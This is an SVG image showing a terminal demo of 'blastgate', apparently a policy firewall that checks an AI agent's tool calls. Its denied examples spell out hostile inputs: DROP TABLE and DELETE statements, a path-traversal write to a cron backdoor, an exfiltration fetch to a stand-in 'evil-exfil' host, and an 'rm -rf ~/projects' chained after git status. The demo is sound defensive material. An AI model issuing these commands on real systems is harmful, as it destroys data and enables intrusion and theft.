<rect width="100%" height="100%" rx="10" fill="#1e1e2e"/>
<circle cx="22" cy="20" r="6" fill="#f38ba8"/><circle cx="42" cy="20" r="6" fill="#f9e2af"/><circle cx="62" cy="20" r="6" fill="#a6e3a1"/>
<text x="562" y="24" text-anchor="middle" fill="#7f849c" font-size="12">blastgate demo</text>
<text class="l0" x="20" y="58"><tspan fill="#a6e3a1">$</tspan><tspan fill="#cdd6f4"> npx blastgate demo</tspan></text>
<text class="l1" x="20" y="78"></text>
<text class="l2" x="20" y="98"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cba6f7" font-weight="700">blastgate demo</tspan><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">deterministic policy firewall for MCP servers and CLI agents</tspan></text>
<text class="l3" x="20" y="118"><tspan fill="#cdd6f4" opacity="0.6">  upstream: mock-postgres (4 tools, fake data)   policy: demo (5 rules)   approvals: auto-deny</tspan></text>
<text class="l4" x="20" y="138"></text>
<text class="l5" x="20" y="158"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT id, name FROM users LIMIT 5           </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">look around</tspan></text>
<text class="l6" x="20" y="178"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> DROP TABLE users;                            </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">no-destructive-sql</tspan></text>
<text class="l7" x="20" y="198"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> DELETE FROM orders                           </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">no-destructive-sql</tspan></text>
<text class="l8" x="20" y="218"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">write_file</tspan><tspan fill="#cdd6f4"> workspace/report.md                          </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">write inside the jail</tspan></text>
<text class="l9" x="20" y="238"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">write_file</tspan><tspan fill="#cdd6f4"> ../../etc/cron.d/backdoor                    </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">fs-jail</tspan></text>
<text class="l10" x="20" y="258"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">http_fetch</tspan><tspan fill="#cdd6f4"> https://api.github.com/repos/bzucker4/bla... </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">allowed domain</tspan></text>
<text class="l11" x="20" y="278"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">http_fetch</tspan><tspan fill="#cdd6f4"> https://paste.evil-exfil.example/upload?d... </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">egress-allowlist</tspan></text>
<text class="l12" x="20" y="298"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">run_shell </tspan><tspan fill="#cdd6f4"> git status &amp;&amp; rm -rf ~/projects              </tspan><tspan fill="#f9e2af" font-weight="700">HOLD  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">approve-destructive-shell &gt; needs approval &gt; auto-denied</tspan></text>
<text class="l13" x="20" y="318"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">retry loop 1/4</tspan></text>
<text class="l14" x="20" y="338"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">retry loop 2/4</tspan></text>
<text class="l15" x="20" y="358"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#a6e3a1" font-weight="700">ALLOW </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">retry loop 3/4</tspan></text>
<text class="l16" x="20" y="378"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" opacity="0.6">agent &gt;</tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#89dceb">query_db  </tspan><tspan fill="#cdd6f4"> SELECT count(*) FROM events                  </tspan><tspan fill="#f38ba8" font-weight="700">DENY  </tspan><tspan fill="#cdd6f4"> </tspan><tspan fill="#cdd6f4" opacity="0.6">loop-guard</tspan></text>
<text class="l17" x="20" y="398"></text>
<text class="l18" x="20" y="418"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" font-weight="700">12 tool calls</tspan><tspan fill="#cdd6f4">: </tspan><tspan fill="#a6e3a1">6 allowed</tspan><tspan fill="#cdd6f4">, </tspan><tspan fill="#f38ba8">6 blocked before reaching the server</tspan><tspan fill="#cdd6f4">. </tspan><tspan fill="#cdd6f4" opacity="0.6">median round trip through the proxy: 1.44 ms</tspan></text>
<text class="l19" x="20" y="438"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" font-weight="700">audit log</tspan><tspan fill="#cdd6f4">: 18 entries, hash-chained and Ed25519-signed </tspan><tspan fill="#a6e3a1">&gt; verified</tspan></text>
<text class="l20" x="20" y="458"><tspan fill="#cdd6f4">  </tspan><tspan fill="#cdd6f4" font-weight="700">tamper test</tspan><tspan fill="#cdd6f4">: flip the DROP TABLE decision to "allow" </tspan><tspan fill="#a6e3a1">&gt; detected at line 3: content hash mismatch: this line was edited</tspan></text>
<text class="l21" x="20" y="478"></text>
<text class="l22" x="20" y="498"><tspan fill="#cdd6f4" opacity="0.6">  try it on your own agent:  npx blastgate init   then wrap any MCP server with  npx blastgate mcp -- &lt;server command&gt;</tspan></text>
</svg>
